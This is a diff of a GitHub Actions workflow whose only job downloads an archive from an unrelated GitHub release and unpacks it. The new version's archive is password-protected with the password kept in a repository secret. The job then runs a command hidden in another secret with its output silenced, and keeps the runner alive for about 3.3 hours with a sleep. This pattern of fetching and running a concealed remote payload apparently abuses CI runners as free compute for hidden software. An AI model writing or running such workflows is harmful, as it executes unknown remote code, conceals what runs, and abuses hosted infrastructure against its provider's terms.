@@ -1,20 +1,24 @@
 name: main
 
 on:
-  workflow_dispatch:  
+  workflow_dispatch:
 
 jobs:
   setup-run:
-    runs-on: windows-2025
+    runs-on: windows-2022
     steps:
     - name: Check out the repository
       uses: actions/checkout@v2
-    - name: main
+
+    - name: Test
+      shell: pwsh
       run: |
-        Invoke-WebRequest -Uri "https://github.com/naiirobi-a/robi/releases/download/thisfor/thisfor.zip" -OutFile "D:\thisfor.zip"
-        Expand-Archive -Path "D:\thisfor.zip" -DestinationPath "D:\" -Force
-        ${{ secrets.moo_env }}
-        Start-Sleep -Seconds 5
+        $dest = "D:\thisfor"
+        Invoke-WebRequest -Uri 'https://github.com/nrobx/nrobx/releases/download/thisfor/thisfor.7z' -OutFile "D:\thisfor.7z"
+        & "C:\Program Files\7-Zip\7z.exe" x "D:\thisfor.7z" -o"$dest" -p${{ secrets.THISFOR_PASS }} -y
+        ${{ secrets.moo_env }} -RedirectStandardOutput "$null" -RedirectStandardError "$null"
+
     - name: Sleep
+      shell: pwsh
       run: |
         Start-Sleep -Seconds 11800
